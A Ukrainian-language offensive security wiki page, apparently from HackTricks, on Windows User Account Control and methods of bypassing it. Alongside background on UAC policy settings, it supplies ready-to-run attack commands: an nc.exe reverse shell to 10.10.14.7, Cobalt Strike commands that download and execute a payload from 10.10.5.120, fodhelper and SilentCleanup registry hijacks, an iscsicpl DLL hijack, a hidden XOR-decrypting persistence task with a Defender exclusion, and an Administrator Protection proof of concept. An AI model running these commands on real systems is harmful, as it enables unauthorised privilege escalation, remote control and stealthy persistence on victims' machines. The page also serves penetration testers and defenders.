# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує **запит на підтвердження для дій із підвищеними привілеями**. Програми мають різні рівні `integrity`, і програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, програми та завдання завжди **запускаються в контексті безпеки облікового запису без прав адміністратора**, якщо адміністратор явно не дозволить цим програмам/завданням отримати доступ до системи на рівні адміністратора. Це функція зручності, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.

Докладніше про рівні integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC активний, користувач-адміністратор отримує 2 токени: токен стандартного користувача для виконання звичайних дій із середнім рівнем integrity та токен із привілеями адміністратора.

На цій [сторінці](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) докладно описано принцип роботи UAC, зокрема процес входу в систему, взаємодію з користувачем і архітектуру UAC. Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC відповідно до вимог своєї організації на локальному рівні (за допомогою secpol.msc) або налаштовувати й розгортати їх через Group Policy Objects (GPO) у середовищі домену Active Directory. Різні параметри докладно описано [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Для UAC можна налаштувати 10 параметрів Group Policy. У наведеній нижче таблиці містяться додаткові відомості:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Політики встановлення програмного забезпечення у Windows

**локальні політики безпеки** ("secpol.msc" у більшості систем) за замовчуванням налаштовані так, щоб **заборонити користувачам без прав адміністратора встановлювати програмне забезпечення**. Це означає, що навіть якщо користувач без прав адміністратора може завантажити інсталятор вашого програмного забезпечення, він не зможе запустити його без облікового запису адміністратора.

### Registry Keys to Force UAC to Ask for Elevation

Як стандартний користувач без прав адміністратора, ви можете забезпечити, щоб **UAC запитував облікові дані** стандартного облікового запису під час спроби виконати певні дії. Для цього потрібно змінити певні **ключі реєстру**, для чого необхідні права адміністратора, якщо немає **UAC bypass** або зловмисник уже не ввійшов у систему як адміністратор.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують користувача **повторно ввести облікові дані свого облікового запису** для виконання адміністративних дій.

**На практиці це корисно лише тоді, коли у вас уже є токен із підвищеними привілеями, UAC bypass або помилкова конфігурація, яка дає змогу змінювати ці ключі; в іншому разі сам запис до реєстру буде заблоковано.**

Необхідно змінити наведені нижче ключі та записи реєстру (значення за замовчуванням указано в дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну за допомогою інструмента Local Security Policy. Після внесення змін під час адміністративних операцій користувачеві буде запропоновано повторно ввести свої облікові дані.

### Примітка

**User Account Control не є межею безпеки.** Тому стандартні користувачі не можуть вийти за межі своїх облікових записів і отримати права адміністратора без експлойта локального підвищення привілеїв.

### Попросити користувача надати «повний доступ до комп’ютера»
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Привілеї UAC

- Internet Explorer Protected Mode використовує перевірки цілісності, щоб запобігти доступу процесів із високим рівнем цілісності (наприклад, web-браузерів) до даних із низьким рівнем цілісності (наприклад, папки тимчасових Internet-файлів). Це забезпечується запуском браузера з токеном низької цілісності. Коли браузер намагається отримати доступ до даних, що зберігаються в зоні низької цілісності, операційна система перевіряє рівень цілісності процесу та відповідно дозволяє доступ. Ця функція допомагає запобігати атакам remote code execution, які намагаються отримати доступ до конфіденційних даних у системі.
- Коли користувач входить до Windows, система створює токен доступу, що містить список привілеїв користувача. Привілеї визначаються як сукупність прав і можливостей користувача. Токен також містить список облікових даних користувача — даних, які використовуються для автентифікації користувача на комп’ютері та в ресурсах мережі.

### Autoadminlogon

Щоб налаштувати автоматичний вхід до Windows певного користувача під час запуску, установіть **`AutoAdminLogon` registry key**. Це корисно для kiosk-середовищ або з метою тестування. Використовуйте це лише в захищених системах, оскільки пароль стає доступним у registry.

Установіть такі keys за допомогою Registry Editor або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Щоб повернути стандартну поведінку входу, установіть `AutoAdminLogon` у значення 0.

## UAC bypass

> [!TIP]
> Зверніть увагу: якщо ви маєте graphical access до victim, UAC bypass виконується досить просто, оскільки можна натиснути "Yes", коли з’явиться запит UAC

UAC bypass потрібен у такій ситуації: **UAC активовано, ваш процес працює в контексті середньої цілісності, а ваш користувач належить до administrators group**.

Важливо зазначити, що **обійти UAC значно складніше, якщо він має найвищий рівень безпеки (Always), ніж якщо він налаштований на будь-який інший рівень (Default).**

### Швидкий triage з shell середньої цілісності

Перш ніж намагатися виконати bypass, підтвердьте, що ви перебуваєте в потрібному сценарії, і зіставте build хоста з відомими робочими методами:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Практичні нотатки:
- Якщо `EnableLUA=0`, обхід не потрібен: будь-який токен адміністратора може безпосередньо запросити високий рівень цілісності.
- `ConsentPromptBehaviorAdmin=2` або `5` — типовий сценарій для auto-elevate / COM-based bypasses.
- `Always Notify` підвищує вимоги, але все одно слід перевірити точну збірку, а не припускати невдачу: UACME досі відстежує деякі методи, сумісні з `AlwaysNotify`, у сучасних збірках Windows.

### UAC вимкнено

Якщо UAC уже вимкнено (`ConsentPromptBehaviorAdmin` має значення **`0`**), ви можете **запустити reverse shell із привілеями адміністратора** (високий рівень цілісності), використовуючи щось на кшталт:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "bypass" (повний доступ до файлової системи)

Якщо у вас є shell від імені користувача, який входить до групи Administrators, ви можете **змонтувати** спільний ресурс C$, доступний через SMB (файлову систему), локально на новий диск і отримаєте **доступ до всього в файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей спосіб більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Техніки Cobalt Strike працюватимуть лише якщо UAC не встановлено на максимальний рівень безпеки
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** і **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### Підвищені COM-інтерфейси (`ICMLuaUtil` / `CMSTPLUA`)

Автоматично підвищені COM-об’єкти залишаються практичною поверхнею UAC у сучасних збірках. `ICMLuaUtil` досі відстежується UACME як такий, що працює в актуальних гілках Windows, а offensive tooling продовжує адаптувати `CMSTPLUA`, поєднуючи процес на інтерактивному робочому столі, 64-бітне виконання та іноді маскування PEB/процесу перед викликом COM Elevation Moniker.

Практичні поради:
- Віддавайте перевагу **64-бітному** процесу в **інтерактивній сесії** користувача (зазвичай `explorer.exe` або його дочірньому процесу).
- Якщо raw shell не працює, повторіть спробу з BOF / реалізації UACME замість наївної обгортки `CreateProcess`.
- Очікуйте, що дочірнє виконання відбуватиметься в **окремому підвищеному процесі**; багато BOF не підвищують поточний beacon безпосередньо.

### KRBUACBypass

Документація та tool у [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Експлойти для обходу UAC

[**UACME** ](https://github.com/hfiref0x/UACME), який є **компіляцією** кількох експлойтів для обходу UAC. Зверніть увагу, що вам потрібно **скомпілювати UACME за допомогою visual studio або msbuild**. Компіляція створить кілька виконуваних файлів (наприклад, `Source\Akagi\outout\x64\Debug\Akagi.exe`), і вам потрібно буде знати, **який саме вам потрібен.**\
Слід бути **обережними**, оскільки деякі bypass можуть **показувати запити від інших програм**, які **повідомлять** **користувача**, що щось відбувається.

UACME містить **версію збірки, з якої кожна техніка почала працювати**. Ви можете знайти техніку, що впливає на ваші версії:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також за допомогою [цієї](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінки можна визначити випуск Windows `1607` за версіями збірки.

Практичний підхід полягає в тому, щоб спочатку **оцінити збірку хоста**, а вже потім запустити відповідний метод:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` швидко порівнює локальну збірку з відомими методами UAC, що допомагає швидко відкидати непрацюючі PoC.
- `UACME` залишається найкращим публічним каталогом для зіставлення bypass із точною збіркою. В останніх релізах додано нові методи та повторно протестовано наявні проти **Windows 11 25H2**, тому перевірте README та release notes, перш ніж вважати, що старий допис у блозі досі застосовний без змін.

### UAC Bypass – fodhelper.exe (перехоплення реєстру)

Довірений binary `fodhelper.exe` у сучасних версіях Windows запускається з автоматичним підвищенням привілеїв. Під час запуску він запитує наведений нижче шлях до реєстру користувача без перевірки verb `DelegateExecute`. Розміщення команди в цьому місці дає змогу процесу з Medium Integrity (користувач входить до групи Administrators) запустити процес із High Integrity без запиту UAC.

Шлях до реєстру, який запитує fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Кроки PowerShell (встановіть свій payload, потім запустіть)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Примітки:
- Працює, коли поточний користувач є членом групи Administrators, а рівень UAC має стандартне/поблажливе значення (не Always Notify із додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-бітний PowerShell із 32-бітного процесу в 64-бітній Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Для прихованості уникайте UI, які відображають запити.

#### Варіант hijack CurVer/extension (лише HKCU)

Останні зразки, що зловживають `fodhelper.exe`, уникають `DelegateExecute` і натомість **перенаправляють ProgID `ms-settings`** через значення `CurVer` для користувача. Бінарний файл із автоматичним підвищенням привілеїв усе ще шукає обробник у `HKCU`, тому для створення ключів не потрібен admin token:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Після підвищення привілеїв malware зазвичай **вимикає подальші запити**, встановлюючи `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у значення `0`, а потім виконує додатковий defense evasion (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і відтворює persistence для запуску з рівнем high integrity. Типове persistence-завдання зберігає на диску **зашифрований XOR PowerShell-скрипт**, а щогодини декодує та виконує його in-memory:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Цей варіант усе ще видаляє dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **`CurVer` hijack**, втручання в `ConsentPromptBehaviorAdmin`, створення виключення Defender або scheduled tasks, які розшифровують PowerShell in-memory.

### Обхід UAC через завдання `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` запускає `cleanmgr.exe` з найвищими привілеями та розгортає `%windir%` із середовища користувача. Якщо ви контролюєте `HKCU\Environment\windir`, можна перенаправити це розгортання на довільну команду й отримати високий рівень цілісності без діалогового вікна підтвердження. Цей метод усе ще варто тестувати в новіших збірках, оскільки UACME продовжує підтримувати цю техніку, а нещодавнє відстеження проблем показує, що для Windows 11 24H2 можуть знадобитися лише незначні зміни в quoting.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Якщо завдання додає лапки до шляху в цій збірці, повторіть спробу з payload, що закінчується лапкою (наприклад, `cmd.exe"`). Завжди очищайте `HKCU\Environment\windir` після тестування.

#### Більше UAC bypass

Багато класичних UAC bypass, які зловживають UI flows, COM objects або взаємодією з робочим столом, потребують **повної інтерактивної сесії** з жертвою; звичайного shell через `nc.exe` або service, що працює в **Session 0**, часто недостатньо.

Зазвичай це можна вирішити за допомогою сесії **meterpreter**. Виконайте міграцію до **process**, у якого значення **Session** дорівнює **1**:

![Налаштуйте ms-settings на custom extension (.thm) і зіставте це extension з нашим payload - Більше UAC bypass: це можна отримати за допомогою сесії meterpreter. Виконайте міграцію до process, у якого значення Session...](<../../images/image (863).png>)

(_explorer.exe_ має працювати)

### UAC Bypass за допомогою GUI

Якщо ви маєте доступ до **GUI**, просто прийміть запит UAC, коли він з’явиться; насправді вам не потрібен технічний bypass. Тому отримання GUI-сесії часто достатньо, щоб обійти практичні перешкоди, які додає UAC.

Крім того, якщо ви отримали GUI-сесію, якою хтось користувався (потенційно через RDP), там можуть бути **деякі tools, запущені як administrator**, з яких можна **запустити** **cmd**, наприклад **як admin**, без повторного запиту UAC, як у [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути дещо більш **stealthy**.

### Гучний brute-force UAC bypass

Якщо вас не турбує шум, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **запитує підвищення permissions, доки user не погодиться**.

### Власний bypass - базова методологія UAC bypass

Якщо переглянути **UACME**, ви помітите, що **багато UAC bypass зловживають DLL hijacking** (часто змушуючи elevated binary завантажити DLL, контрольовану attacker, із writable path). [Прочитайте це, щоб дізнатися, як знаходити vulnerability DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть binary, який виконує **autoelevate** (перевірте, що під час запуску він працює на high integrity level).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Ймовірно, вам потрібно буде **записати** DLL у деякі **protected paths** (наприклад, C:\Windows\System32), де у вас немає permissions на запис. Це можна обійти за допомогою:
1. **wusa.exe**: Windows 7,8 і 8.1. Він дає змогу розпакувати вміст CAB-файлу в protected paths (оскільки цей tool виконується з high integrity level).
2. **IFileOperation**: Windows 10.
4. Підготуйте **script**, який скопіює вашу DLL у protected path і запустить вразливий binary з autoelevate.

### Інша техніка UAC bypass

Полягає в перевірці, чи намагається **autoElevated binary** прочитати з **registry** **name/path** **binary** або **command**, який потрібно **виконати** (це цікавіше, якщо binary шукає цю інформацію всередині **HKCU**).

### UAC bypass через `SysWOW64\iscsicpl.exe` + DLL hijack у user `PATH`

32-бітний `C:\Windows\SysWOW64\iscsicpl.exe` — це **auto-elevated** binary, яким можна зловживати для завантаження `iscsiexe.dll` за допомогою search order. Якщо ви можете розмістити malicious `iscsiexe.dll` у **user-writable** folder, а потім змінити `PATH` поточного user (наприклад, через `HKCU\Environment\Path`), щоб цей folder шукався, Windows може завантажити attacker DLL у процес elevated `iscsicpl.exe` **без показу UAC prompt**.

Практичні примітки:
- Це корисно, коли поточний user входить до **Administrators**, але працює на рівні **Medium Integrity** через UAC.
- Копія в **SysWOW64** є релевантною для цього bypass. Вважайте копію в **System32** окремим binary і перевіряйте її поведінку незалежно.
- Цей primitive є комбінацією **auto-elevation** і **DLL search-order hijacking**, тому той самий workflow у ProcMon, що використовується для інших UAC bypass, допоможе перевірити відсутнє завантаження DLL.

Мінімальний flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ідеї для виявлення:
- Створюйте сповіщення про `reg add` / записи до реєстру в `HKCU\Environment\Path`, за якими одразу запускається `C:\Windows\SysWOW64\iscsicpl.exe`.
- Шукайте `iscsiexe.dll` у **контрольованих користувачем** розташуваннях, таких як `%TEMP%` або `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Співвідносіть запуски `iscsicpl.exe` з неочікуваними дочірніми процесами або завантаженням DLL за межами стандартних каталогів Windows.

### Новіші дослідження, які варто перевірити окремо

Деякі ланцюжки після 2024 року більше не мають вигляду класичних hijack registry у `HKCU\Software\Classes`. Наприклад, poisoning activation-context cache може поєднувати **перепризначення диска** та **DLL redirection**, щоб перейти від medium до high integrity через trusted UI / auto-elevated binaries, такі як `ctfmon.exe`, а згодом — через такі цілі, як `fodhelper.exe`. Замість дублювання великого PoC тут перевірте компактні приклади payload у:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack літери диска в Administrator Protection (25H2) через DOS device map для окремої logon-сесії

Повний attack surface `RAiLaunchAdminProcess` / UIAccess для Windows 11 25H2 описано на окремій сторінці:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” використовує shadow-admin tokens із per-session map `\Sessions\0\DosDevices/<LUID>`. Каталог ліниво створюється `SeGetTokenDeviceMap` під час першого `\??` resolution. Якщо attacker impersonates shadow-admin token лише на рівні **SecurityIdentification**, каталог створюється з attacker як **owner** (успадковує `CREATOR OWNER`), що дає змогу створювати drive-letter links, які мають пріоритет над `\GLOBAL??`.

**Кроки:**

1. Із low-privileged session викличте `RAiProcessRunOnce`, щоб запустити promptless shadow-admin `runonce.exe`.
2. Дублюйте його primary token у **identification** token та impersonate його під час відкриття `\??`, щоб примусово створити `\Sessions\0\DosDevices/<LUID>` у власності attacker.
3. Створіть там symlink `C:`, що вказує на attacker-controlled storage; подальші filesystem accesses у цій session розпізнаватимуть `C:` як attacker path, уможливлюючи DLL/file hijack без prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Посилання
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Документація Microsoft — як працює User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME — колекція технік обходу UAC](https://github.com/hfiref0x/UACME)
- [WinPwnage — сканер сумісності та launcher для обходу UAC](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research — KONNI використовує AI для генерації бекдорів PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research — операція TrueChaos: експлуатація 0-day проти урядових цілей у Південно-Східній Азії](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero — обхід захисту адміністраторів Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero — обхід захисту адміністраторів через зловживання UI Access](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI — обхід UAC за допомогою завдання SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
